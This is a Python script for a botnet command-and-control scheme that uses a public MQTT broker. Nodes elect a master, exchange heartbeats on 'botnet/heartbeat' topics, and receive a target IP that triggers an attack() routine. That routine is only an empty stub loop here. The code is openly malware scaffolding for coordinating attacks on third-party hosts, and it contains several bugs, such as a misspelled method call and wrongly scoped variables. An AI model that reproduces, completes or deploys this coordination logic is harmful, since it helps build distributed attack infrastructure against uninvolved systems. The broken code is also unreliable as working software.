import paho.mqtt.client as mqtt
import time
broker = "iot.eclipse.org"
port = 1883
global received,nodeId,lastId,target
target=0
received=-1
lastId=-555
nodeId=-1
def on_publish(client,userdata,result): 
    print("data published \n")
    pass
def on_connectm(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))
    client.subscribe("botnet/target")
    client.subscribe("botnet/lastId")
    client.unsuscribe("botnet/heartbeat")
def on_messagem(client, userdata, msg):
    global received
    global lastId
    print(msg.topic+" "+str(msg.payload))
    print(" ")
    received=1
    if(msg.topic=="botnet/lastId" and lastId!=int(msg.payload)):
        lastId=int(msg.payload)
        print("New local last id:",lastId)
    if(msg.topic=="botnet/target"):
        target=str(msg.payload)
        print("New local target:",target)
def on_connectsc(client, userdata, flags, rc):
        print("Connected with result code "+str(rc))
        client.subscribe("botnet/heartbeat")
def on_messagesc(client, userdata, msg):
        global received
        global lastId
        global target
        received=1
        inp=str(msg.payload)[2:-1].split(" ")
        print("Target/Id",inp[0],inp[1])
        topic=str(msg.topic)
        print(" ")
        if(topic=="botnet/heartbeat" and lastId!=int(inp[1])):
            lastId=int(inp[1])
            print("New local last id:",lastId)
        if(msg.topic=="botnet/heartbeat" and inp[0]!="0"): ##Regex for catching ip
           target= inp[0]
           attack()
        
def heartbeat():
    global target
    global lastId
    return str(target)+" "+str(lastId)
def isSlave():
    return nodeId==1
def isReceived():
    return received==1
def attack():
    global target
    startTime=time.time()
    while(True):
        ##get
        client.loop(.1)
        if(int((time.time()-startTime)%60)==0):
            print("Checking")
            if(target=="0"):
                break
                return
            startTime=time.time()
        #delay

def slave():
    global client
    global nodeId
    print("I'm slave")
    client.on_connect = on_connectsc
    client.on_message = on_messagesc
    client.on_publish = on_publish
    client.connect(broker,port)
    startTime=time.time()
    time.sleep(1)
    while(nodeId==1):
        client.loop(.1)
        if(int((time.time()-startTime)%60%2)==0):
            startTime=time.time()
            if (not isReceived()):
                master()
def master():
    global client
    global nodeId
    global lastId
    print("No alive nodes, i'll be the master one")
    client.on_connect = on_connectm
    client.on_message = on_messagem
    client.on_publish = on_publish
    client.connect(broker,port)
    
##    sub a target
##    sub a id
##    publish cada 2 -> ip id

    if(nodeId==-1):
        lastId=0
        nodeId=0
    startTime=time.time()
    while(nodeId==0):
        client.loop(.1)
        if(int((time.time()-startTime)%60%1)==0):
            startTime=time.time()
            time.sleep(1)
            ret= client.publish("botnet/heartbeat",heartbeat())
            
            print("Last id:",lastId)
            print(ret)
def common():
    global client
    def setNodeId(newLastId):
        global nodeId
        nodeId=newLastId
        print("Node id:",newLastId)
        ret= client.publish("botnet/lastId",nodeId)

    
    client.on_connect = on_connectsc
    client.on_message = on_messagesc
    client.on_publish = on_publish
    client.connect(broker,port)
    
    startTime=time.time()
    time.sleep(1)
    while(True):
        client.loop(.1)
        #print("Mi id",nodeId)
        if(int((time.time()-startTime)%60%14)==0):
            time.sleep(1)## 15 seconds elapsed
            #print("15 seconds elapsed")
            
            if(nodeId==-1 and isReceived()):   
                setNodeId(lastId+1)
            if(isReceived()):
                received=0
            else:
                nodeId-=1
##            if(not isReceived()and ):
##                master()
##                #client.loop_stop()
##                break
            if(isSlave()):
                slave()
    
 
client = mqtt.Client()
common()

